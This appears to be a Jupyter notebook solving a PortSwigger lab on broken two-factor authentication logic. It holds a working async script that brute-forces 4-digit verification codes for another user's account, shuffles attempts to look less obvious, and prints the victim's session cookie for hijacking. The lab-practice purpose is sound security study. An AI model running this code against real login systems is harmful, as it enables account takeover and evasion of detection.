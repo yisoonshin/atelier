{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Context\n",
    "\n",
    "In a lab from Portswigger Academy, we are presented a situation where manipulating a cookie value will allow us to generate a 2FA verification code for the target account.\n",
    "https://portswigger.net/web-security/authentication/multi-factor/lab-2fa-broken-logic\n",
    "\n",
    "The goal from that point is to brute force the verification code (302 = success). \n",
    "Making the requests is the easy part (can use Burp Intruder), but the problem is the speed at which we arrive at the correct code. 4 digits is 10k (10 digits ^ 4) possibilities. We aren't necessarily able to 'vectorize' this operation, but we can make requests in larger batches asychronously."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {},
   "outputs": [],
   "source": [
    "import random\n",
    "import requests\n",
    "import asyncio\n",
    "import aiohttp\n",
    "import time"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "302\n",
      "\n"
     ]
    }
   ],
   "source": [
    "# Testing out the normal Requests logic and setting up our header + data payloads\n",
    "# using the account we have access to to obtain the verification code.\n",
    "\n",
    "cookies = {\n",
    "    'session':'eGXnwz9tdrnIUuCuwu0znWm8O1Uiwh09',\n",
    "    'verify':'wiener' # This is what enables the code to be generated\n",
    "}\n",
    "\n",
    "# CSRF prevention token - the post request will not work without it\n",
    "csrf = 'RmdhFXKT0eYw6FFi1AgXiK19MOz7IYPP'\n",
    "\n",
    "payload = {\n",
    "    'csrf':csrf,\n",
    "    'mfa-code':'1810'\n",
    "}\n",
    "\n",
    "# Code is generated when this page is visited\n",
    "url = 'https://ac3a1f3b1f5a6b9c80e43b1d00f3000f.web-security-academy.net/login2'\n",
    "\n",
    "# Need to have redirects disabled to confirm that the code is correct\n",
    "attempt = requests.post(url=url, cookies = cookies, data = payload, allow_redirects=False)\n",
    "\n",
    "print(attempt.status_code)\n",
    "print(attempt.text)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "302\n",
      "\n"
     ]
    }
   ],
   "source": [
    "# Test asynchronous method using aiohttp.\n",
    "\n",
    "cookies = {\n",
    "    'session':'eZnQvusDB4jE8UgK5PzetVGM7mcsoSJH',\n",
    "    'verify':'wiener'\n",
    "}\n",
    "\n",
    "csrf = '62u51PRbJQCkr9XZ6ESXz0U4xMOrzc67'\n",
    "payload = {\n",
    "    'csrf':csrf,\n",
    "    'mfa-code':'1530'\n",
    "}\n",
    "url = 'https://ac3a1f3b1f5a6b9c80e43b1d00f3000f.web-security-academy.net/login2'\n",
    "\n",
    "# async and await must be used for these 'co-routines'\n",
    "async with aiohttp.ClientSession(cookies=cookies) as session:\n",
    "    async with session.post(url=url, data=payload, allow_redirects=False) as attempt:\n",
    "        print(attempt.status)\n",
    "        print(await attempt.text())"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "['0000', '0001', '0002', '0003', '0004', '0005', '0006', '0007', '0008', '0009'] \n",
      " ['8737', '5994', '9354', '9597', '2714', '5452', '6286', '5895', '5040', '6415']\n"
     ]
    }
   ],
   "source": [
    "# Now to generate our fuzzing values (left padded w/zeroes). \n",
    "digits = 4\n",
    "# Convert the integer range to strings left-padded with 0\n",
    "possibilities = [f'{i:0{digits}}' for i in range(0, 10 ** digits)]\n",
    "\n",
    "# Randomize order to make it less obvious.\n",
    "random.seed(1337)\n",
    "fuzzing = random.sample(possibilities, len(possibilities))\n",
    "\n",
    "# Test outputs.\n",
    "test = fuzzing[:10]\n",
    "print(possibilities[:10], '\\n', test)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 7,
   "metadata": {
    "scrolled": true
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Attempt 1 200\n",
      "Attempt 2 200\n",
      "Attempt 3 200\n",
      "Attempt 4 200\n",
      "Attempt 5 200\n",
      "Attempt 6 200\n",
      "Attempt 7 200\n",
      "Attempt 8 200\n",
      "Attempt 9 200\n",
      "Attempt 10 200\n",
      "0.374386278\n"
     ]
    }
   ],
   "source": [
    "# Speed test the standard looping method.\n",
    "cookies = {\n",
    "    'session':'kc5N4edDKcZavBrBCumKB4TpnhdECq2p',\n",
    "    'verify':'wiener'\n",
    "}\n",
    "\n",
    "csrf = 'sXAvgAls9clDah7pMVVBChJNrGSLUp2v'\n",
    "url = 'https://ac3a1f3b1f5a6b9c80e43b1d00f3000f.web-security-academy.net/login2'\n",
    "\n",
    "sync_start = time.process_time()\n",
    "with requests.Session() as s:\n",
    "    s.cookies = requests.cookies.cookiejar_from_dict(cookies)\n",
    "    for code in test:\n",
    "        payload = {\n",
    "        'csrf':csrf,\n",
    "        'mfa-code':code\n",
    "        }\n",
    "        try:\n",
    "            attempt = s.post(url=url, cookies=cookies, data=payload)\n",
    "            print(f'Attempt {fuzzing.index(code) + 1}', attempt.status_code)\n",
    "        except:\n",
    "            pass\n",
    "    \n",
    "sync_perf = time.process_time() - sync_start\n",
    "print(sync_perf)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 8,
   "metadata": {
    "scrolled": true
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Attempt 4 9597 200\n",
      "Attempt 8 5895 200\n",
      "Attempt 9 5040 200\n",
      "Attempt 10 6415 200\n",
      "Attempt 2 5994 200\n",
      "Attempt 7 6286 200\n",
      "Attempt 1 8737 200\n",
      "Attempt 3 9354 200\n",
      "Attempt 6 5452 200\n",
      "Attempt 5 2714 200\n",
      "0.11750488699999995\n"
     ]
    }
   ],
   "source": [
    "# Speed test the async method\n",
    "\n",
    "cookies = {\n",
    "    'session':'kc5N4edDKcZavBrBCumKB4TpnhdECq2p',\n",
    "    'verify':'wiener'\n",
    "}\n",
    "\n",
    "csrf = 'sXAvgAls9clDah7pMVVBChJNrGSLUp2v'\n",
    "url = 'https://ac3a1f3b1f5a6b9c80e43b1d00f3000f.web-security-academy.net/login2'\n",
    "\n",
    "# Create async function\n",
    "async def attempt(code, lst, session):\n",
    "    payload = {\n",
    "        'csrf':csrf,\n",
    "        'mfa-code':code\n",
    "    }\n",
    "    try:\n",
    "        async with session.post(url=url, data=payload) as attempt:\n",
    "            print(f'Attempt {lst.index(code) + 1}', code, attempt.status)\n",
    "    except:\n",
    "        pass\n",
    "    \n",
    "async_start = time.process_time()\n",
    "async with aiohttp.ClientSession(cookies=cookies) as session:\n",
    "    # Cap on max concurrent\n",
    "    sem = asyncio.Semaphore(100)\n",
    "    async with sem:\n",
    "        await asyncio.gather(*[attempt(code, fuzzing, session) for code in test])\n",
    "        \n",
    "async_perf = time.process_time() - async_start\n",
    "print(async_perf)\n",
    "\n",
    "# Notice how these aren't in order since responses are retrieved asynchronously\n",
    "# This method is 3-4x faster!"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 15,
   "metadata": {
    "scrolled": true
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Set-Cookie: session=iTNJU4GHBloSSjxXdKYCvK0gxbf79ir2; Domain=acb01fef1fb5a5de802f24a4009d005d.web-security-academy.net; HttpOnly; Path=/; Secure\n"
     ]
    },
    {
     "ename": "CancelledError",
     "evalue": "",
     "output_type": "error",
     "traceback": [
      "\u001b[0;31m---------------------------------------------------------------------------\u001b[0m",
      "\u001b[0;31mCancelledError\u001b[0m                            Traceback (most recent call last)",
      "\u001b[0;32m<ipython-input-15-3fb9dda54fca>\u001b[0m in \u001b[0;36m<module>\u001b[0;34m\u001b[0m\n\u001b[1;32m     32\u001b[0m     \u001b[0msem\u001b[0m \u001b[0;34m=\u001b[0m \u001b[0masyncio\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mSemaphore\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;36m100\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m     33\u001b[0m     \u001b[0;32masync\u001b[0m \u001b[0;32mwith\u001b[0m \u001b[0msem\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m---> 34\u001b[0;31m         \u001b[0;32mawait\u001b[0m \u001b[0masyncio\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mgather\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;34m*\u001b[0m\u001b[0;34m[\u001b[0m\u001b[0mattempt\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mcode\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mfuzzing\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0msession\u001b[0m\u001b[0;34m)\u001b[0m \u001b[0;32mfor\u001b[0m \u001b[0mcode\u001b[0m \u001b[0;32min\u001b[0m \u001b[0mfuzzing\u001b[0m\u001b[0;34m]\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m",
      "\u001b[0;31mCancelledError\u001b[0m: "
     ]
    }
   ],
   "source": [
    "# Let's obtain the code for carlos\n",
    "\n",
    "cookies = {\n",
    "    'session':'hyUmhBYCWJaWUEfRaI04pyDOB479kYgt',\n",
    "    'verify':'carlos'\n",
    "}\n",
    "\n",
    "csrf = 'dxc9q3zYd1GOVmeSziNbQ9jjbY8QW262'\n",
    "url = 'https://acb01fef1fb5a5de802f24a4009d005d.web-security-academy.net/login2'\n",
    "\n",
    "async def attempt(code, lst, session):\n",
    "    payload = {\n",
    "        'csrf':csrf,\n",
    "        'mfa-code':code\n",
    "    }\n",
    "    \n",
    "    try:\n",
    "        async with session.post(url=url, data=payload, allow_redirects=False) as attempt:\n",
    "            # print(f'Attempt {lst.index(code) + 1}', code, attempt.status)\n",
    "            if attempt.status == 302:\n",
    "                # show the session cookie to hijack\n",
    "                print(attempt.cookies['session'])\n",
    "                # Stop the process since we have the right code. \n",
    "                # You may need to still kill the cell manually\n",
    "                await session.close()\n",
    "    except:\n",
    "        pass\n",
    "\n",
    "    \n",
    "async with aiohttp.ClientSession(cookies=cookies) as session:\n",
    "    # Cap on max concurrent\n",
    "    sem = asyncio.Semaphore(100)\n",
    "    async with sem:\n",
    "        await asyncio.gather(*[attempt(code, fuzzing, session) for code in fuzzing])"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.8.5"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 4
}
